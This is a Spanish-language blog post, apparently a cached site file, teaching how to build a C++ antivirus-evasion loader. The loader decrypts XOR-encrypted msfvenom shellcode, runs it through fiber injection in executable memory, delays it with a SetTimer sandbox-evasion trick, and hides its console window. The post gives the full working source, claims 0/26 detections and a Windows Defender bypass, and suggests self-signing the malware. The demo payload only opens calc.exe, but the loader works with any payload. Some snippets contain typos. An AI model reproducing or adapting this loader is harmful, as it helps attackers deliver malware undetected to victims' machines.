@@ -1,0 +1,290 @@
+I"�n<p class="lead">Desarrollaremos un programa en C++ para inyectar una shellcode cifrada con XOR, ademas evadiremos los antivirus usando la tecnica Fiber Injection y un Timming Attack</p>
+
+<p>Que ondaa, esta vez te voy a enseñar como pude evadir la deteccion de algunos antivirus de antiscan.me, y como evadir el windows defender, para esto use 3 cosas</p>
+
+<ul>
+  <li>Una shellcode cifrada con XOR</li>
+  <li>La tecnica <code class="language-plaintext highlighter-rouge">fiber injection</code></li>
+  <li>Timming attack usando <code class="language-plaintext highlighter-rouge">SetTimer</code></li>
+</ul>
+
+<h2 id="fibers-fibras">Fibers (Fibras)</h2>
+
+<p>Como sabras, cuando se ejecuta una aplicacion, el sistema operativo le asigna un proceso dentro de la memoria, por ejemplo, los procesos que ves al abrir al administrador de tereas, pues bien, esos procesos pueden tener otros subprocesos para ejecutar tareas en paralelo, a esto se le conoce como hilos, y es algo clave en la programacion concurrente, sin embargo, dentro de un hilo se puede estar ejecutando otra tarea, y para esto se usan las fibras.</p>
+
+<p>La definicion que nos da la WinAPI, es: <strong>“Una fibra es una unidad de ejecución que la aplicación debe programar manualmente”</strong>, pero la neta no se le entiende casi nada, asi que pongamos algo mas simple, una fibra tambien es conocida como un <code class="language-plaintext highlighter-rouge">hilo liviano</code>, es decir, una unidad de ejeucion que desprende de un hilo, osea que las fibras se ejecutan en el contexto del hilo que las creo, una caracteristica, es que un hilo puede tener varias fibras pero solo una puede ejecutarse una sola a la vez, y nosotros dedicimos cual, amenos que usemos SwitchToFiber para intercalar la ejecución</p>
+
+<h2 id="timming-attack-o-ataques-basados-en-temporizadores">Timming attack o ataques basados en temporizadores</h2>
+
+<p>En el contexto del desarrollo de malware, un timming attack se refiere a suspender o dormir la actividad del malware por un cierto periodo de tiempo, por ejemplo, podemos agregar un delay cuando se ejecute por primera vez, o podemos decirle al malware que ejecute sus acciones en una fecha, hora, dia, y momento especifico, es decir, cada cierto tiempo, para estas implementaciones se usan funciones de temporizado, de ahi su nombre.</p>
+
+<p><strong>Ojo</strong>: esto solo seria en el contexto del malware, tambien hay otro contexto de los timming attack que son los <code class="language-plaintext highlighter-rouge">side channel timing attack</code> o en español, <code class="language-plaintext highlighter-rouge">ataques de canal lateral basados en temporizadores</code>, pero eso es otro tema que no importa en este momento.</p>
+
+<h3 id="fiber-injection">Fiber injection</h3>
+
+<p>Es muy simple, la inyeccion de fibras se refiere a inyectar una fibra en el flujo de ejecucion del proceso, para implementar una inyeccion clasica de este tipo, se usan las funciones.</p>
+
+<ul>
+  <li><strong>ConvertThreadToFiber()</strong>: Para convertir el hilo principal en una fibra</li>
+  <li><strong>VirtualAlloc()</strong>: Para asignar memoria para la fibra</li>
+  <li><strong>CreateFiber()</strong>: Para crear una nueva fibra que contendra la shellcode</li>
+  <li><strong>SwitchToFiber()</strong>: Para ejecutar la fibra que tiene la shellcode</li>
+</ul>
+
+<p>Llamando a las funciones en ese orden podriamos hacer una fiber injection clasica, pero al fin de cuenta esto es programacion, y cada quien la puede implementar como le sale de su cabecita, o dependiendo del contexto donde se vaya a ejecutar, ahora te voy a explicar como la implemente, primero de pondre todo el codigo y te explicare que es lo que hace</p>
+
+<h4 id="codigo-completo">Codigo completo</h4>
+<p>Fue escrito y compilado desde Dev C++</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
+#include &lt;winuser.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">fiber_injection</span><span class="p">(){</span>
+	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+	    <span class="s">"</span><span class="se">\x86\x32\xf9\x9e\x8a\x92\xba\x7a\x7a\x7a\x3b\x2b\x3b\x2a</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x28\x2b\x2c\x32\x4b\xa8\x1f\x32\xf1\x28\x1a\x32\xf1\x28</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x62\x32\xf1\x28\x5a\x32\xf1\x08\x2a\x32\x75\xcd\x30\x30</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x37\x4b\xb3\x32\x4b\xba\xd6\x46\x1b\x06\x78\x56\x5a\x3b</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\xbb\xb3\x77\x3b\x7b\xbb\x98\x97\x28\x3b\x2b\x32\xf1\x28</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x5a\xf1\x38\x46\x32\x7b\xaa\xf1\xfa\xf2\x7a\x7a\x7a\x32</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\xff\xba\x0e\x1d\x32\x7b\xaa\x2a\xf1\x32\x62\x3e\xf1\x3a</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x5a\x33\x7b\xaa\x99\x2c\x32\x85\xb3\x3b\xf1\x4e\xf2\x32</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x7b\xac\x37\x4b\xb3\x32\x4b\xba\xd6\x3b\xbb\xb3\x77\x3b</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x7b\xbb\x42\x9a\x0f\x8b\x36\x79\x36\x5e\x72\x3f\x43\xab</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x0f\xa2\x22\x3e\xf1\x3a\x5e\x33\x7b\xaa\x1c\x3b\xf1\x76</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x32\x3e\xf1\x3a\x66\x33\x7b\xaa\x3b\xf1\x7e\xf2\x32\x7b</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\xaa\x3b\x22\x3b\x22\x24\x23\x20\x3b\x22\x3b\x23\x3b\x20</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x32\xf9\x96\x5a\x3b\x28\x85\x9a\x22\x3b\x23\x20\x32\xf1</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x68\x93\x2d\x85\x85\x85\x27\x32\xc0\x7b\x7a\x7a\x7a\x7a</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x7a\x7a\x7a\x32\xf7\xf7\x7b\x7b\x7a\x7a\x3b\xc0\x4b\xf1</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x15\xfd\x85\xaf\xc1\x8a\xcf\xd8\x2c\x3b\xc0\xdc\xef\xc7</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\xe7\x85\xaf\x32\xf9\xbe\x52\x46\x7c\x06\x70\xfa\x81\x9a</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\x0f\x7f\xc1\x3d\x69\x08\x15\x10\x7a\x23\x3b\xf3\xa0\x85</span><span class="s">"</span>
+	    <span class="s">"</span><span class="se">\xaf\x19\x1b\x16\x19\x54\x1f\x02\x1f\x7a</span><span class="s">"</span>
+	<span class="p">};</span>
+
+	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+		<span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">)(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="sc">'z'</span><span class="p">);</span>
+	<span class="p">}</span>
+
+  	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">shellcode_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
+
+	<span class="n">LPVOID</span> <span class="n">exec_mem</span><span class="p">;</span>
+	<span class="n">LPVOID</span> <span class="n">shellcode_fiber</span><span class="p">;</span> 
+
+	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span>
+	    <span class="nb">NULL</span><span class="p">,</span>
+	    <span class="n">shellcode_len</span><span class="p">,</span>
+	    <span class="n">MEM_COMMIT</span><span class="p">,</span>
+	    <span class="n">PAGE_EXECUTE_READWRITE</span>
+	<span class="p">);</span>
+
+	<span class="n">memcpy</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_len</span><span class="p">);</span>
+	<span class="n">shellcode_fiber</span> <span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPFIBER_START_ROUTINE</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+  	<span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
+
+  	<span class="n">DeleteFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
+  	<span class="n">VirtualFree</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MEM_RELEASE</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">VOID</span> <span class="n">CALLBACK</span> <span class="nf">shellcode_routine</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">param</span><span class="p">){</span>
+	<span class="n">UINT_PTR</span> <span class="n">timerId</span> <span class="o">=</span> <span class="n">SetTimer</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">20000</span><span class="p">,</span> <span class="p">[](</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">uMsg</span><span class="p">,</span> <span class="n">UINT_PTR</span> <span class="n">idEvent</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwTime</span><span class="p">)</span> <span class="p">{</span>
+    	<span class="n">fiber_injection</span><span class="p">();</span>
+    	<span class="n">KillTimer</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">idEvent</span><span class="p">);</span>
+  	<span class="p">});</span>
+
+  	<span class="n">MSG</span> <span class="n">msg</span><span class="p">;</span>
+  	<span class="k">while</span> <span class="p">(</span><span class="n">GetMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>	
+    	<span class="n">TranslateMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">);</span>
+    	<span class="n">DispatchMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">);</span>
+  	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+	
+	<span class="n">HWND</span> <span class="n">ventana_cmd</span> <span class="o">=</span> <span class="n">GetConsoleWindow</span><span class="p">();</span>
+	<span class="n">ShowWindow</span><span class="p">(</span><span class="n">ventana_cmd</span><span class="p">,</span> <span class="n">SW_HIDE</span><span class="p">);</span>
+
+	<span class="n">LPVOID</span> <span class="n">main_fiber</span> <span class="o">=</span> <span class="n">ConvertThreadToFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+  	<span class="n">LPVOID</span> <span class="n">shellcode_fiber</span> <span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">shellcode_routine</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+  	<span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
+  	<span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">main_fiber</span><span class="p">);</span>
+
+  	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="funcion-fiber_injection">Funcion fiber_injection()</h2>
+
+<ul>
+  <li>Dentro de la funcion <code class="language-plaintext highlighter-rouge">fiber_injection()</code> tenemos la definicion de nuestra shellcode, esa shellcode fue generada con msfvenom usando crifrado XOR la cual ejecuta el comando <code class="language-plaintext highlighter-rouge">calc.exe</code>: <code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/exec CMD=calc.exe -f c --encrypt xor --encrypt-key z</code>.</li>
+</ul>
+
+<p>(te recomiendo cambiar la clave del cifrado XOR)</p>
+
+<ul>
+  <li>Posteriormente para poder inyectar la shellcode, la debemos de decifrar en tiempo de ejecucion usando la operacion <code class="language-plaintext highlighter-rouge">XOR</code> con la clave de cifrado, y para eso usamos este for:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+	<span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">)(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="sc">'z'</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Usando <code class="language-plaintext highlighter-rouge">unsigned int shellcode_len = sizeof(shellcode);</code> le estamos diciendo que obtenga el tamaño total en bytes de la shellcode</p>
+  </li>
+  <li>
+    <p>Despues necesitamos asignar memoria para nuestra shellcode, para esto usamos <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>:</p>
+  </li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span>
+	    <span class="nb">NULL</span><span class="p">,</span>
+	    <span class="n">shellcode_len</span><span class="p">,</span>
+	    <span class="n">MEM_COMMIT</span><span class="p">,</span>
+	    <span class="n">PAGE_EXECUTE_READWRITE</span>
+<span class="p">);</span>
+</code></pre></div></div>
+<p>El primer parametro de la direccion de memoria donde se va a asignar, y le puse NULL para que el sistema operativo lo haga, el segundo parametro es el tamaño en bytes que se van a asignar, y le pase la variable que tiene el tamaño, el tercero es el tipo de asignacion y le puse <code class="language-plaintext highlighter-rouge">MEM_COMMIT</code> para que inicialmente la asignacion contenga puros ceros, y el ultimo argumento son las protecciones de memoria que tendra esa asignacion, y le puse que tenga permisos de ejecucion, escritura, y lectura</p>
+
+<ul>
+  <li>Despues se copia la shellcode en la memoria que se asigno con <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">memcpy</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_len</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li>A este punto ya tenemos la memoria lista para nuestra shellcode, ahora debemos de crear una fibra, para eso usamos <code class="language-plaintext highlighter-rouge">CreateFiber</code>:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode_fiber</span> <span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPFIBER_START_ROUTINE</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Lo que esta haciendo es crear una fibra, donde la ejecucion de la fibra comienza desde la direccion que regresa <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, el primer parametro es el tamaño del stack de la fibra, le puse en 0 para que agarre el tamaño por defecto, el segundo parametro es la direccion inicial de la fibra, y observa que el segundo parametro se agrego de esta forma <code class="language-plaintext highlighter-rouge">(LPFIBER_START_ROUTINE)exec_mem</code>, y lo que esta haciendo <code class="language-plaintext highlighter-rouge">LPFIBER_START_ROUTINE</code> es definir un puntero como una rutina, que vendria siendo una funcion de callback a nuestra direccion de inicio de la fibra, la cual se encuentra en <code class="language-plaintext highlighter-rouge">exec_mem</code></p>
+
+<ul>
+  <li>Despues de que creamos la fibra, debemos de restaurar el estado de la fibra de la shellcode para ejecutarla, para eso usamos</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>El unico parametro que recibe es la direccion de la fibra, la cual se almacena en <code class="language-plaintext highlighter-rouge">shellcode_fiber</code>.</p>
+
+<ul>
+  <li>Las ultima dos funciones solo son para eliminar la fibra despues de que se ejecute y liberar memoria</li>
+</ul>
+
+<p>Asi que todo lo que se encuentra dentro de la funcion <code class="language-plaintext highlighter-rouge">fiber_injection</code> es solamente para hacer una clasica inyeccion de fibras, a este punto ya se implemento la primera tecnica, y para que esa funcion se ejecute solo hay que llamarla asi <code class="language-plaintext highlighter-rouge">fiber_injection()</code></p>
+
+<hr />
+
+<h2 id="funcion-shellcode_routine-callback">Funcion shellcode_routine (callback)</h2>
+
+<ul>
+  <li>
+    <p>Despues en el codigo tenemos una funcion callback, donde se implementa la segunda tecnica (timming attack), esta implementacion del callback vendria siendo una implementacio manual de <code class="language-plaintext highlighter-rouge">LPFIBER_START_ROUTINE</code></p>
+  </li>
+  <li>
+    <p>Lo que tenemos primero es un temporizador que agregara un delay de 20 segundos antes de ejecutar la fibra que contiene la shellcode:</p>
+  </li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">UINT_PTR</span> <span class="n">timerId</span> <span class="o">=</span> <span class="n">SetTimer</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">20000</span><span class="p">,</span> <span class="p">[](</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">uMsg</span><span class="p">,</span> <span class="n">UINT_PTR</span> <span class="n">idEvent</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwTime</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">fiber_injection</span><span class="p">();</span><span class="n">witchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
+    <span class="n">KillTimer</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">idEvent</span><span class="p">);</span>
+<span class="p">});</span>	
+
+</code></pre></div></div>
+
+<p>Dentro de los parametros de <code class="language-plaintext highlighter-rouge">SetTimer</code> le indicamos en milisegundos el tiempo que va a esperar para ejecutarse lo que se encuentre dentro, y en este caso es la llamada a la funcion <code class="language-plaintext highlighter-rouge">fiber_injection</code>, esto es una clasica implementacion de un timming attack que agrega un pequeño delay al inicio de la ejecucion del malware para evadir los antivirus</p>
+
+<ul>
+  <li>Despues tenemos un pequeño bucle declarado de esta forma:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="p">(</span><span class="n">GetMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>	
+    	<span class="n">TranslateMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">);</span>
+    	<span class="n">DispatchMessage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Donde con <code class="language-plaintext highlighter-rouge">GetMessage</code> le estamos diciendo que se siga ejecutando hasta que reciba una señal de salida, esa señal de salida se manda a llamar desde <code class="language-plaintext highlighter-rouge">TranslateMessage</code> y <code class="language-plaintext highlighter-rouge">DispatchMessage</code>, esto se usa por que debemos de procesar los mensajes, y con ayuda de esas funciones, la fibra esta respondiendo a los mensajes recibidos y manteniendo la ejecución en curso.</p>
+
+<p>Asi que toda la funcion <code class="language-plaintext highlighter-rouge">VOID CALLBACK shellcode_routine</code> implementa una funcion de callback para hacer un timming attack en la fibra de la shellcode.</p>
+
+<hr />
+
+<h2 id="funcion-main">Funcion Main</h2>
+
+<p>A este punto ya solo nos queda mandar a llamar a la funcion <code class="language-plaintext highlighter-rouge">main()</code>,</p>
+
+<ul>
+  <li>Lo primero que tenemos en el main son dos funciones que lo que hacen es ocultar la ventana del cmd que se abre al ejecutar el binario:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HWND</span> <span class="n">ventana_cmd</span> <span class="o">=</span> <span class="n">GetConsoleWindow</span><span class="p">();</span>
+<span class="n">ShowWindow</span><span class="p">(</span><span class="n">ventana_cmd</span><span class="p">,</span> <span class="n">SW_HIDE</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Despues se esta conviertiendo el hilo principal en una fibra:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="n">main_fiber</span> <span class="o">=</span> <span class="n">ConvertThreadToFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Esto con el fin de cambiar de contexto entre las fibras</p>
+
+<ul>
+  <li>La funcion que sigue crea una fibra donde el segundo parametro es el callback creado anteriormente:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="n">shellcode_fiber</span> <span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">shellcode_routine</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Despues ejecuta la fibra creada anteriormente:</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">witchToFiber</span><span class="p">(</span><span class="n">shellcode_fiber</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y por ultimo ejecuta la fibra principal</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">main_fiber</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Como te daras cuenta, se ejecutan 3 fibras</p>
+
+<ul>
+  <li>La fibra principal</li>
+  <li>La fibra de la shellcode que manda a llamar al callback <code class="language-plaintext highlighter-rouge">shellcode_routine</code></li>
+  <li>Y la fibra de la funcion <code class="language-plaintext highlighter-rouge">fiber_injection</code>, yo la llamo la <code class="language-plaintext highlighter-rouge">fibra comodin</code></li>
+</ul>
+
+<p>Ahora te preguntaras “¿Por que 3 fibras, si solo una es la que inyecta la shellcode?”, pues ahi te va la explicacion de por que las 3 fibras evaden los antivirus</p>
+
+<p>Las 3 fibras se usan de la siguiente manera, cuando en el main se ejecuta la primera fibra que manda a llamar a <code class="language-plaintext highlighter-rouge">shellcode_routine</code>, lo que va a pasar es que entrara a la funcion callback y esperara 20 segundos para ejecutar la <code class="language-plaintext highlighter-rouge">fibra comodin</code>, mientras que a su vez en el main se hace un llamado para ejectutar otra fibra, que es la fibra principal (main_fiber), y lo que estaria pasando es que la fibra que mando a llamar a <code class="language-plaintext highlighter-rouge">shellcode_routine</code> y la <code class="language-plaintext highlighter-rouge">main_fiber</code> se estarian ejecutandose en contextos diferentes, permitiendo que la ejecucion de la <code class="language-plaintext highlighter-rouge">fibra comidin</code> pase desapercibida por los antivirus ocultando su actividad e inyectando la shellcode mientras que el programa sigue fluyendo normalmente ejecutandose en el hilo principal mediante la <code class="language-plaintext highlighter-rouge">main_fiber</code>, asi que los antivirus lo unico que estarian detectando es la <code class="language-plaintext highlighter-rouge">main_fiber</code> que no tiene un comportamiendo extraño, Genial, ¿No?.</p>
+
+<h4 id="resultados">Resultados</h4>
+
+<p>0/26 antiscan.me - Fecha: 15 de junio del 2023</p>
+
+<p><img src="/assets/img/bypassAV_fiber/antiscanme.png" alt="" /></p>
+
+<p>Bypass Windows defender:</p>
+
+<video src="/assets/img/bypassAV_fiber/poc.mp4" controls="controls" width="720"></video>
+
+<h4 id="mejoras-rapidas">Mejoras rapidas</h4>
+
+<p>Aun que el defender no lo haya detectado, es evidente que se puede mejorar para evitar la deteccion cuando se descarga e intenta ejecutar un software desconocido, es decir, cuando no tiene ninguna firma de un certificado de autenticidad, para evadir eso, puedes firmar el malware generando un certificado tu mismo</p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
